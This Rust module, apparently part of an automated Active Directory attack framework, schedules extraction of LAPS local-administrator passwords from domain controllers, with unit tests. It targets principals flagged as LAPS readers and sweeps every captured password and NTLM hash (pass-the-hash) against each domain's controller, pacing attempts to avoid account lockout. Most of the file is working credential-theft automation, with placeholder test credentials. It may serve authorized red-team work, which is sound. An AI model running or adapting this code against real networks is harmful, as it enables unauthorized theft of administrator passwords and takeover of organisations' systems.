//! auto_laps_extraction -- explicitly read LAPS passwords from AD.
//!
//! LAPS stores local administrator passwords in the `ms-Mcs-AdmPwd` (legacy)
//! or `msLAPS-Password` (Windows LAPS) attribute. Any principal with read
//! access on the computer object can retrieve it.
//!
//! This module dispatches explicit LAPS read attempts for each credential
//! against each discovered host, complementing the low_hanging_fruit task
//! which bundles LAPS with other checks.

use std::sync::Arc;
use std::time::Duration;

use serde_json::json;
use tokio::sync::watch;
use tracing::{info, warn};

use crate::orchestrator::dispatcher::Dispatcher;
use crate::orchestrator::state::StateInner;

/// Dedup key prefix for LAPS extraction.
const DEDUP_LAPS: &str = "laps_extract";

/// Returns `true` if the vulnerability type is a LAPS candidate.
fn is_laps_candidate(vuln_type: &str) -> bool {
    let vtype = vuln_type.to_lowercase();
    vtype == "laps_abuse" || vtype == "laps_reader" || vtype == "laps"
}

/// Path 1: Vulnerability-driven LAPS — BloodHound or an ACL probe surfaced an
/// explicit LAPS-reader principal. Match the principal to a known credential
/// and emit one work item per (unexploited, unprocessed) LAPS vulnerability.
///
/// Filters mirror the inline path: `is_laps_candidate` vuln types,
/// not-yet-exploited, not-yet-dispatched, and the principal must be present in
/// `state.credentials` (we lack auth material to act on a name we can't
/// authenticate as). Splits out so the per-vuln field extraction can be unit
/// tested without spinning a Dispatcher.
fn collect_laps_vuln_work(state: &StateInner) -> Vec<LapsWork> {
    let mut items = Vec::new();
    for vuln in state.discovered_vulnerabilities.values() {
        if !is_laps_candidate(&vuln.vuln_type) {
            continue;
        }
        if state.exploited_vulnerabilities.contains(&vuln.vuln_id) {
            continue;
        }
        let dedup_key = format!("{DEDUP_LAPS}:vuln:{}", vuln.vuln_id);
        if state.is_processed(DEDUP_LAPS, &dedup_key) {
            continue;
        }

        let reader = vuln
            .details
            .get("source")
            .or_else(|| vuln.details.get("account_name"))
            .or_else(|| vuln.details.get("reader"))
            .and_then(|v| v.as_str());

        let domain = vuln
            .details
            .get("domain")
            .and_then(|v| v.as_str())
            .unwrap_or("");

        let target_computer = vuln
            .details
            .get("target")
            .or_else(|| vuln.details.get("target_computer"))
            .and_then(|v| v.as_str())
            .unwrap_or("");

        let credential = reader.and_then(|r| {
            state
                .credentials
                .iter()
                .find(|c| {
                    c.username.to_lowercase() == r.to_lowercase()
                        && (domain.is_empty() || c.domain.to_lowercase() == domain.to_lowercase())
                })
                .cloned()
        });

        if let Some(cred) = credential {
            let dc_ip = state
                .domain_controllers
                .get(&domain.to_lowercase())
                .cloned();
            items.push(LapsWork {
                dedup_key,
                domain: domain.to_string(),
                dc_ip,
                target_computer: if target_computer.is_empty() {
                    None
                } else {
                    Some(target_computer.to_string())
                },
                credential: cred,
                nt_hash: None,
                vuln_id: Some(vuln.vuln_id.clone()),
            });
        }
    }
    items
}

/// Path 2: Domain-wide LAPS sweep — try each plaintext credential against its
/// domain's DC to read LAPS for every computer. Mirrors the hash-fallback
/// sweep filters (`collect_laps_hash_sweep_work`) so the same principal is
/// never dispatched twice across both paths.
fn collect_laps_sweep_work(state: &StateInner) -> Vec<LapsWork> {
    let mut items = Vec::new();
    for cred in state.credentials.iter().filter(|c| {
        !c.domain.is_empty()
            && !c.password.is_empty()
            && !state.is_delegation_account(&c.username)
            && !state.is_principal_quarantined(&c.username, &c.domain)
    }) {
        let dedup_key = format!(
            "{DEDUP_LAPS}:sweep:{}:{}",
            cred.domain.to_lowercase(),
            cred.username.to_lowercase()
        );
        if state.is_processed(DEDUP_LAPS, &dedup_key) {
            continue;
        }
        let dc_ip = state
            .domain_controllers
            .get(&cred.domain.to_lowercase())
            .cloned();
        if dc_ip.is_none() {
            continue;
        }
        items.push(LapsWork {
            dedup_key,
            domain: cred.domain.clone(),
            dc_ip,
            target_computer: None,
            credential: cred.clone(),
            nt_hash: None,
            vuln_id: None,
        });
    }
    items
}

/// Domain-wide LAPS sweep via NTLM hash (pass-the-hash) — a LAPS-reader
/// principal may only exist in `state.hashes` (e.g. surfaced by
/// secretsdump on the DC) without a plaintext password. Treat each NTLM
/// hash as a sweep credential; downstream `laps_dump` routes to
/// `netexec -H` instead of `-p`.
///
/// Filters mirror Path 2 (plaintext sweep) so a principal already
/// dispatched via password isn't re-dispatched via hash and vice versa:
///   * empty domain — can't pick a DC
///   * non-NTLM hash — `netexec -H` expects NTLM
///   * empty hash value
///   * delegation accounts — reserved for S4U, spraying causes lockout
///   * quarantined principals — currently locked out
///   * already-processed dedup key — sweep was dispatched on a prior tick
///   * no DC IP known for the domain — defer until probe finds one
fn collect_laps_hash_sweep_work(state: &StateInner) -> Vec<LapsWork> {
    let mut items = Vec::new();
    for h in state.hashes.iter().filter(|h| {
        !h.domain.is_empty()
            && h.hash_type.to_lowercase() == "ntlm"
            && !h.hash_value.is_empty()
            && !state.is_delegation_account(&h.username)
            && !state.is_principal_quarantined(&h.username, &h.domain)
    }) {
        // Same dedup key namespace as plaintext sweep so we don't
        // re-dispatch for a principal we already covered via password.
        let dedup_key = format!(
            "{DEDUP_LAPS}:sweep:{}:{}",
            h.domain.to_lowercase(),
            h.username.to_lowercase()
        );
        if state.is_processed(DEDUP_LAPS, &dedup_key) {
            continue;
        }

        let dc_ip = state
            .domain_controllers
            .get(&h.domain.to_lowercase())
            .cloned();
        if dc_ip.is_none() {
            continue;
        }

        items.push(LapsWork {
            dedup_key,
            domain: h.domain.clone(),
            dc_ip,
            target_computer: None,
            credential: ares_core::models::Credential {
                id: String::new(),
                username: h.username.clone(),
                password: String::new(),
                domain: h.domain.clone(),
                source: "hash_fallback".into(),
                discovered_at: None,
                is_admin: false,
                parent_id: None,
                attack_step: 0,
            },
            nt_hash: Some(h.hash_value.clone()),
            vuln_id: None,
        });
    }
    items
}

/// Build the dispatch payload for a `laps_dump` work item. Splits out so
/// the optional-field assembly (nt_hash for PTH, dc_ip, target_computer,
/// vuln_id) can be unit-tested without spinning a Dispatcher.
fn build_laps_payload(item: &LapsWork) -> serde_json::Value {
    let mut payload = json!({
        "technique": "laps_dump",
        "domain": item.domain,
        "credential": {
            "username": item.credential.username,
            "password": item.credential.password,
            "domain": item.credential.domain,
        },
    });

    if let Some(ref hash) = item.nt_hash {
        payload["nt_hash"] = json!(hash);
    }
    if let Some(ref dc) = item.dc_ip {
        payload["target_ip"] = json!(dc);
        payload["dc_ip"] = json!(dc);
    }
    if let Some(ref comp) = item.target_computer {
        payload["target_computer"] = json!(comp);
    }
    if let Some(ref vid) = item.vuln_id {
        payload["vuln_id"] = json!(vid);
    }
    payload
}

/// Monitors for LAPS-readable hosts and dispatches password extraction.
/// Interval: 45s. Runs after initial credential discovery to avoid wasting
/// unauthenticated cycles.
pub async fn auto_laps_extraction(
    dispatcher: Arc<Dispatcher>,
    mut shutdown: watch::Receiver<bool>,
) {
    let mut interval = tokio::time::interval(Duration::from_secs(45));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        if !dispatcher.is_technique_allowed("laps") {
            continue;
        }

        let work: Vec<LapsWork> = {
            let state = dispatcher.state.read().await;

            if state.credentials.is_empty() {
                continue;
            }

            // Three paths to LAPS:
            // 1. Vuln-driven: BloodHound/ACL analysis found explicit LAPS read access
            // 2. Domain-wide sweep: try each plaintext credential against the DC
            //    to read LAPS for all computers (netexec ldap -M laps)
            // 3. Hash-fallback sweep: same as #2 but pass-the-hash when only an
            //    NTLM hash is available for a candidate principal.
            let mut items = collect_laps_vuln_work(&state);
            items.extend(collect_laps_sweep_work(&state));
            items.extend(collect_laps_hash_sweep_work(&state));

            // Limit to avoid spamming
            let limit = if dispatcher.config.strategy.is_comprehensive() {
                10
            } else {
                3
            };
            items.into_iter().take(limit).collect()
        };

        for item in work {
            let payload = build_laps_payload(&item);

            let priority = dispatcher.effective_priority("laps");
            match dispatcher
                .throttled_submit("credential_access", "credential_access", payload, priority)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(
                        task_id = %task_id,
                        domain = %item.domain,
                        username = %item.credential.username,
                        target = ?item.target_computer,
                        "LAPS extraction dispatched"
                    );
                    dispatcher
                        .state
                        .write()
                        .await
                        .mark_processed(DEDUP_LAPS, item.dedup_key.clone());
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_LAPS, &item.dedup_key)
                        .await;
                }
                Ok(None) => {}
                Err(e) => warn!(err = %e, "Failed to dispatch LAPS extraction"),
            }
        }
    }
}

struct LapsWork {
    dedup_key: String,
    domain: String,
    dc_ip: Option<String>,
    target_computer: Option<String>,
    credential: ares_core::models::Credential,
    /// Pass-the-hash material when no plaintext password is available. When
    /// `Some`, the dispatch payload sets `nt_hash` and downstream `laps_dump`
    /// routes to `netexec -H` instead of `-p`.
    nt_hash: Option<String>,
    vuln_id: Option<String>,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn is_laps_candidate_laps_abuse() {
        assert!(is_laps_candidate("laps_abuse"));
    }

    #[test]
    fn is_laps_candidate_laps_reader() {
        assert!(is_laps_candidate("laps_reader"));
    }

    #[test]
    fn is_laps_candidate_laps_plain() {
        assert!(is_laps_candidate("laps"));
    }

    #[test]
    fn is_laps_candidate_case_insensitive() {
        assert!(is_laps_candidate("LAPS_ABUSE"));
        assert!(is_laps_candidate("Laps_Reader"));
        assert!(is_laps_candidate("LAPS"));
    }

    #[test]
    fn is_laps_candidate_negative() {
        assert!(!is_laps_candidate("rbcd"));
        assert!(!is_laps_candidate("constrained_delegation"));
        assert!(!is_laps_candidate("esc1"));
        assert!(!is_laps_candidate("gmsa"));
        assert!(!is_laps_candidate("laps_something_else"));
        assert!(!is_laps_candidate(""));
    }

    #[test]
    fn dedup_laps_value() {
        assert_eq!(DEDUP_LAPS, "laps_extract");
    }

    #[test]
    fn vuln_dedup_key_format() {
        let vuln_id = "vuln-laps-dc01";
        let dedup_key = format!("{DEDUP_LAPS}:vuln:{vuln_id}");
        assert_eq!(dedup_key, "laps_extract:vuln:vuln-laps-dc01");
    }

    #[test]
    fn sweep_dedup_key_format() {
        let domain = "contoso.local";
        let username = "svc_admin";
        let dedup_key = format!(
            "{DEDUP_LAPS}:sweep:{}:{}",
            domain.to_lowercase(),
            username.to_lowercase()
        );
        assert_eq!(dedup_key, "laps_extract:sweep:contoso.local:svc_admin");
    }

    #[test]
    fn sweep_dedup_key_normalizes_case() {
        let dedup_key = format!(
            "{DEDUP_LAPS}:sweep:{}:{}",
            "CONTOSO.LOCAL".to_lowercase(),
            "SVC_Admin".to_lowercase()
        );
        assert_eq!(dedup_key, "laps_extract:sweep:contoso.local:svc_admin");
    }

    // collect_laps_hash_sweep_work

    fn ntlm_hash(username: &str, domain: &str, value: &str) -> ares_core::models::Hash {
        ares_core::models::Hash {
            id: String::new(),
            username: username.into(),
            hash_value: value.into(),
            hash_type: "NTLM".into(),
            domain: domain.into(),
            cracked_password: None,
            source: "test".into(),
            discovered_at: None,
            parent_id: None,
            attack_step: 0,
            aes_key: None,
            is_previous: false,
            source_host: None,
            is_trust_key: false,
            trust_pair_label: None,
        }
    }

    fn state_with_dc(domain: &str, dc_ip: &str) -> StateInner {
        let mut s = StateInner::new("op-test".into());
        s.domain_controllers
            .insert(domain.to_lowercase(), dc_ip.into());
        s
    }

    #[test]
    fn laps_hash_sweep_emits_work_item_for_valid_ntlm_hash() {
        let mut s = state_with_dc("contoso.local", "192.168.58.10");
        s.hashes
            .push(ntlm_hash("alice", "contoso.local", "abcd1234"));

        let work = collect_laps_hash_sweep_work(&s);
        assert_eq!(work.len(), 1);
        let item = &work[0];
        assert_eq!(item.domain, "contoso.local");
        assert_eq!(item.dc_ip.as_deref(), Some("192.168.58.10"));
        assert_eq!(item.nt_hash.as_deref(), Some("abcd1234"));
        assert_eq!(item.credential.username, "alice");
        assert_eq!(item.credential.password, "");
        assert_eq!(item.credential.source, "hash_fallback");
        assert!(item.vuln_id.is_none());
        assert!(item.target_computer.is_none());
        assert_eq!(item.dedup_key, "laps_extract:sweep:contoso.local:alice");
    }

    #[test]
    fn laps_hash_sweep_skips_empty_domain() {
        let mut s = state_with_dc("contoso.local", "192.168.58.10");
        s.hashes.push(ntlm_hash("alice", "", "abcd1234"));
        assert!(collect_laps_hash_sweep_work(&s).is_empty());
    }

    #[test]
    fn laps_hash_sweep_skips_non_ntlm_hash_type() {
        let mut s = state_with_dc("contoso.local", "192.168.58.10");
        let mut h = ntlm_hash("alice", "contoso.local", "abcd1234");
        h.hash_type = "aes256".into();
        s.hashes.push(h);
        assert!(collect_laps_hash_sweep_work(&s).is_empty());
    }

    #[test]
    fn laps_hash_sweep_skips_empty_hash_value() {
        let mut s = state_with_dc("contoso.local", "192.168.58.10");
        s.hashes.push(ntlm_hash("alice", "contoso.local", ""));
        assert!(collect_laps_hash_sweep_work(&s).is_empty());
    }

    #[test]
    fn laps_hash_sweep_skips_when_no_dc_for_domain() {
        // No DC registered for the domain — defer until host scan finds it.
        let mut s = StateInner::new("op-test".into());
        s.hashes
            .push(ntlm_hash("alice", "contoso.local", "abcd1234"));
        assert!(collect_laps_hash_sweep_work(&s).is_empty());
    }

    #[test]
    fn laps_hash_sweep_skips_quarantined_principal() {
        let mut s = state_with_dc("contoso.local", "192.168.58.10");
        s.hashes
            .push(ntlm_hash("alice", "contoso.local", "abcd1234"));
        s.quarantine_principal("alice", "contoso.local");
        assert!(collect_laps_hash_sweep_work(&s).is_empty());
    }

    #[test]
    fn laps_hash_sweep_skips_delegation_account() {
        let mut s = state_with_dc("contoso.local", "192.168.58.10");
        // Register the principal as a constrained-delegation account so
        // `is_delegation_account` returns true for it.
        let mut details = std::collections::HashMap::new();
        details.insert(
            "account_name".into(),
            serde_json::Value::String("svc_web".into()),
        );
        s.discovered_vulnerabilities.insert(
            "vuln-deleg".into(),
            ares_core::models::VulnerabilityInfo {
                vuln_id: "vuln-deleg".into(),
                vuln_type: "constrained_delegation".into(),
                target: "192.168.58.10".into(),
                discovered_by: "test".into(),
                discovered_at: chrono::Utc::now(),
                details,
                recommended_agent: String::new(),
                priority: 1,
            },
        );
        s.hashes
            .push(ntlm_hash("svc_web", "contoso.local", "abcd1234"));
        assert!(collect_laps_hash_sweep_work(&s).is_empty());
    }

    #[test]
    fn laps_hash_sweep_skips_already_processed_dedup_key() {
        let mut s = state_with_dc("contoso.local", "192.168.58.10");
        s.hashes
            .push(ntlm_hash("alice", "contoso.local", "abcd1234"));
        s.mark_processed(DEDUP_LAPS, "laps_extract:sweep:contoso.local:alice".into());
        assert!(collect_laps_hash_sweep_work(&s).is_empty());
    }

    #[test]
    fn laps_hash_sweep_normalizes_case_in_dedup_lookup() {
        // Hash carries mixed-case domain/username but the DC lookup and
        // dedup key go through `.to_lowercase()` — the work item is still
        // emitted.
        let mut s = state_with_dc("contoso.local", "192.168.58.10");
        s.hashes
            .push(ntlm_hash("Alice", "CONTOSO.LOCAL", "abcd1234"));
        let work = collect_laps_hash_sweep_work(&s);
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].dedup_key, "laps_extract:sweep:contoso.local:alice");
    }

    #[test]
    fn laps_hash_sweep_emits_one_item_per_eligible_hash() {
        let mut s = state_with_dc("contoso.local", "192.168.58.10");
        s.hashes
            .push(ntlm_hash("alice", "contoso.local", "abcd1234"));
        s.hashes.push(ntlm_hash("bob", "contoso.local", "deadbeef"));
        let work = collect_laps_hash_sweep_work(&s);
        assert_eq!(work.len(), 2);
    }

    // build_laps_payload

    fn work_item(nt_hash: Option<&str>) -> LapsWork {
        LapsWork {
            dedup_key: "laps_extract:sweep:contoso.local:alice".into(),
            domain: "contoso.local".into(),
            dc_ip: Some("192.168.58.10".into()),
            target_computer: None,
            credential: ares_core::models::Credential {
                id: String::new(),
                username: "alice".into(),
                password: "P@ssw0rd!".into(),
                domain: "contoso.local".into(),
                source: "test".into(),
                discovered_at: None,
                is_admin: false,
                parent_id: None,
                attack_step: 0,
            },
            nt_hash: nt_hash.map(str::to_string),
            vuln_id: None,
        }
    }

    #[test]
    fn build_laps_payload_omits_nt_hash_when_password_only() {
        let payload = build_laps_payload(&work_item(None));
        assert_eq!(payload["technique"], "laps_dump");
        assert_eq!(payload["domain"], "contoso.local");
        assert_eq!(payload["credential"]["username"], "alice");
        assert_eq!(payload["credential"]["password"], "P@ssw0rd!");
        assert!(payload.get("nt_hash").is_none());
        assert_eq!(payload["target_ip"], "192.168.58.10");
        assert_eq!(payload["dc_ip"], "192.168.58.10");
    }

    #[test]
    fn build_laps_payload_includes_nt_hash_for_pth() {
        let payload = build_laps_payload(&work_item(Some("abcd1234")));
        assert_eq!(payload["nt_hash"], "abcd1234");
        // Other fields stay intact.
        assert_eq!(payload["technique"], "laps_dump");
        assert_eq!(payload["dc_ip"], "192.168.58.10");
    }

    #[test]
    fn build_laps_payload_includes_optional_target_computer_and_vuln_id() {
        let mut item = work_item(None);
        item.target_computer = Some("ws01.contoso.local".into());
        item.vuln_id = Some("vuln-laps-1".into());
        let payload = build_laps_payload(&item);
        assert_eq!(payload["target_computer"], "ws01.contoso.local");
        assert_eq!(payload["vuln_id"], "vuln-laps-1");
    }

    #[test]
    fn build_laps_payload_omits_dc_ip_when_unknown() {
        let mut item = work_item(None);
        item.dc_ip = None;
        let payload = build_laps_payload(&item);
        assert!(payload.get("target_ip").is_none());
        assert!(payload.get("dc_ip").is_none());
    }

    // collect_laps_vuln_work

    fn vuln_with_details(
        vuln_id: &str,
        vuln_type: &str,
        details: Vec<(&str, &str)>,
    ) -> ares_core::models::VulnerabilityInfo {
        let mut map = std::collections::HashMap::new();
        for (k, v) in details {
            map.insert(k.into(), serde_json::Value::String(v.into()));
        }
        ares_core::models::VulnerabilityInfo {
            vuln_id: vuln_id.into(),
            vuln_type: vuln_type.into(),
            target: String::new(),
            discovered_by: "test".into(),
            discovered_at: chrono::Utc::now(),
            details: map,
            recommended_agent: String::new(),
            priority: 5,
        }
    }

    fn plaintext_cred(
        username: &str,
        domain: &str,
        password: &str,
    ) -> ares_core::models::Credential {
        ares_core::models::Credential {
            id: String::new(),
            username: username.into(),
            password: password.into(),
            domain: domain.into(),
            source: "test".into(),
            discovered_at: None,
            is_admin: false,
            parent_id: None,
            attack_step: 0,
        }
    }

    #[test]
    fn laps_vuln_work_emits_item_when_reader_credential_known() {
        let mut s = state_with_dc("contoso.local", "192.168.58.10");
        s.discovered_vulnerabilities.insert(
            "vuln-laps-1".into(),
            vuln_with_details(
                "vuln-laps-1",
                "laps_reader",
                vec![
                    ("source", "alice"),
                    ("domain", "contoso.local"),
                    ("target", "ws01.contoso.local"),
                ],
            ),
        );
        s.credentials
            .push(plaintext_cred("alice", "contoso.local", "P@ss!"));

        let work = collect_laps_vuln_work(&s);
        assert_eq!(work.len(), 1);
        let item = &work[0];
        assert_eq!(item.vuln_id.as_deref(), Some("vuln-laps-1"));
        assert_eq!(item.domain, "contoso.local");
        assert_eq!(item.dc_ip.as_deref(), Some("192.168.58.10"));
        assert_eq!(item.target_computer.as_deref(), Some("ws01.contoso.local"));
        assert_eq!(item.credential.username, "alice");
        assert!(item.nt_hash.is_none());
        assert_eq!(item.dedup_key, "laps_extract:vuln:vuln-laps-1");
    }

    #[test]
    fn laps_vuln_work_falls_back_to_account_name_then_reader() {
        let mut s = state_with_dc("contoso.local", "192.168.58.10");
        s.discovered_vulnerabilities.insert(
            "vuln-1".into(),
            vuln_with_details(
                "vuln-1",
                "laps",
                vec![("account_name", "bob"), ("domain", "contoso.local")],
            ),
        );
        s.credentials
            .push(plaintext_cred("bob", "contoso.local", "P@ss!"));
        assert_eq!(collect_laps_vuln_work(&s).len(), 1);

        // `reader` key works too
        s.discovered_vulnerabilities.clear();
        s.discovered_vulnerabilities.insert(
            "vuln-2".into(),
            vuln_with_details(
                "vuln-2",
                "laps_abuse",
                vec![("reader", "bob"), ("domain", "contoso.local")],
            ),
        );
        assert_eq!(collect_laps_vuln_work(&s).len(), 1);
    }

    #[test]
    fn laps_vuln_work_skips_non_laps_vulnerability() {
        let mut s = state_with_dc("contoso.local", "192.168.58.10");
        s.discovered_vulnerabilities.insert(
            "vuln-x".into(),
            vuln_with_details(
                "vuln-x",
                "rbcd",
                vec![("source", "alice"), ("domain", "contoso.local")],
            ),
        );
        s.credentials
            .push(plaintext_cred("alice", "contoso.local", "P@ss!"));
        assert!(collect_laps_vuln_work(&s).is_empty());
    }

    #[test]
    fn laps_vuln_work_skips_already_exploited() {
        let mut s = state_with_dc("contoso.local", "192.168.58.10");
        s.discovered_vulnerabilities.insert(
            "vuln-done".into(),
            vuln_with_details(
                "vuln-done",
                "laps_reader",
                vec![("source", "alice"), ("domain", "contoso.local")],
            ),
        );
        s.credentials
            .push(plaintext_cred("alice", "contoso.local", "P@ss!"));
        s.exploited_vulnerabilities.insert("vuln-done".into());
        assert!(collect_laps_vuln_work(&s).is_empty());
    }

    #[test]
    fn laps_vuln_work_skips_already_processed_dedup_key() {
        let mut s = state_with_dc("contoso.local", "192.168.58.10");
        s.discovered_vulnerabilities.insert(
            "vuln-p".into(),
            vuln_with_details(
                "vuln-p",
                "laps_reader",
                vec![("source", "alice"), ("domain", "contoso.local")],
            ),
        );
        s.credentials
            .push(plaintext_cred("alice", "contoso.local", "P@ss!"));
        s.mark_processed(DEDUP_LAPS, "laps_extract:vuln:vuln-p".into());
        assert!(collect_laps_vuln_work(&s).is_empty());
    }

    #[test]
    fn laps_vuln_work_skips_when_reader_principal_has_no_credential() {
        let mut s = state_with_dc("contoso.local", "192.168.58.10");
        s.discovered_vulnerabilities.insert(
            "vuln-orphan".into(),
            vuln_with_details(
                "vuln-orphan",
                "laps_reader",
                vec![("source", "ghost"), ("domain", "contoso.local")],
            ),
        );
        // No credential for "ghost" — item must not be emitted.
        assert!(collect_laps_vuln_work(&s).is_empty());
    }

    #[test]
    fn laps_vuln_work_target_computer_falls_back_to_target_field() {
        let mut s = state_with_dc("contoso.local", "192.168.58.10");
        s.discovered_vulnerabilities.insert(
            "vuln-tgt".into(),
            vuln_with_details(
                "vuln-tgt",
                "laps_reader",
                vec![
                    ("source", "alice"),
                    ("domain", "contoso.local"),
                    ("target", "ws07.contoso.local"),
                ],
            ),
        );
        s.credentials
            .push(plaintext_cred("alice", "contoso.local", "P@ss!"));
        let work = collect_laps_vuln_work(&s);
        assert_eq!(
            work[0].target_computer.as_deref(),
            Some("ws07.contoso.local")
        );
    }

    #[test]
    fn laps_vuln_work_target_computer_none_when_unspecified() {
        let mut s = state_with_dc("contoso.local", "192.168.58.10");
        s.discovered_vulnerabilities.insert(
            "vuln-no-tgt".into(),
            vuln_with_details(
                "vuln-no-tgt",
                "laps_reader",
                vec![("source", "alice"), ("domain", "contoso.local")],
            ),
        );
        s.credentials
            .push(plaintext_cred("alice", "contoso.local", "P@ss!"));
        assert!(collect_laps_vuln_work(&s)[0].target_computer.is_none());
    }

    // collect_laps_sweep_work

    #[test]
    fn laps_sweep_emits_item_for_plaintext_credential_with_dc() {
        let mut s = state_with_dc("contoso.local", "192.168.58.10");
        s.credentials
            .push(plaintext_cred("alice", "contoso.local", "P@ss!"));
        let work = collect_laps_sweep_work(&s);
        assert_eq!(work.len(), 1);
        let item = &work[0];
        assert_eq!(item.credential.username, "alice");
        assert_eq!(item.dedup_key, "laps_extract:sweep:contoso.local:alice");
        assert!(item.nt_hash.is_none());
        assert!(item.vuln_id.is_none());
        assert!(item.target_computer.is_none());
    }

    #[test]
    fn laps_sweep_skips_empty_password() {
        let mut s = state_with_dc("contoso.local", "192.168.58.10");
        s.credentials
            .push(plaintext_cred("alice", "contoso.local", ""));
        assert!(collect_laps_sweep_work(&s).is_empty());
    }

    #[test]
    fn laps_sweep_skips_empty_domain() {
        let mut s = state_with_dc("contoso.local", "192.168.58.10");
        s.credentials.push(plaintext_cred("alice", "", "P@ss!"));
        assert!(collect_laps_sweep_work(&s).is_empty());
    }

    #[test]
    fn laps_sweep_skips_when_no_dc_for_domain() {
        let mut s = StateInner::new("op-test".into());
        s.credentials
            .push(plaintext_cred("alice", "contoso.local", "P@ss!"));
        assert!(collect_laps_sweep_work(&s).is_empty());
    }

    #[test]
    fn laps_sweep_skips_quarantined_principal() {
        let mut s = state_with_dc("contoso.local", "192.168.58.10");
        s.credentials
            .push(plaintext_cred("alice", "contoso.local", "P@ss!"));
        s.quarantine_principal("alice", "contoso.local");
        assert!(collect_laps_sweep_work(&s).is_empty());
    }

    #[test]
    fn laps_sweep_skips_delegation_account() {
        let mut s = state_with_dc("contoso.local", "192.168.58.10");
        let mut details = std::collections::HashMap::new();
        details.insert(
            "account_name".into(),
            serde_json::Value::String("svc_web".into()),
        );
        s.discovered_vulnerabilities.insert(
            "vuln-deleg".into(),
            ares_core::models::VulnerabilityInfo {
                vuln_id: "vuln-deleg".into(),
                vuln_type: "constrained_delegation".into(),
                target: "192.168.58.10".into(),
                discovered_by: "test".into(),
                discovered_at: chrono::Utc::now(),
                details,
                recommended_agent: String::new(),
                priority: 1,
            },
        );
        s.credentials
            .push(plaintext_cred("svc_web", "contoso.local", "P@ss!"));
        assert!(collect_laps_sweep_work(&s).is_empty());
    }

    #[test]
    fn laps_sweep_skips_already_processed_dedup_key() {
        let mut s = state_with_dc("contoso.local", "192.168.58.10");
        s.credentials
            .push(plaintext_cred("alice", "contoso.local", "P@ss!"));
        s.mark_processed(DEDUP_LAPS, "laps_extract:sweep:contoso.local:alice".into());
        assert!(collect_laps_sweep_work(&s).is_empty());
    }

    #[test]
    fn laps_sweep_emits_one_item_per_eligible_credential() {
        let mut s = state_with_dc("contoso.local", "192.168.58.10");
        s.credentials
            .push(plaintext_cred("alice", "contoso.local", "P@ss!"));
        s.credentials
            .push(plaintext_cred("bob", "contoso.local", "p2"));
        assert_eq!(collect_laps_sweep_work(&s).len(), 2);
    }
}
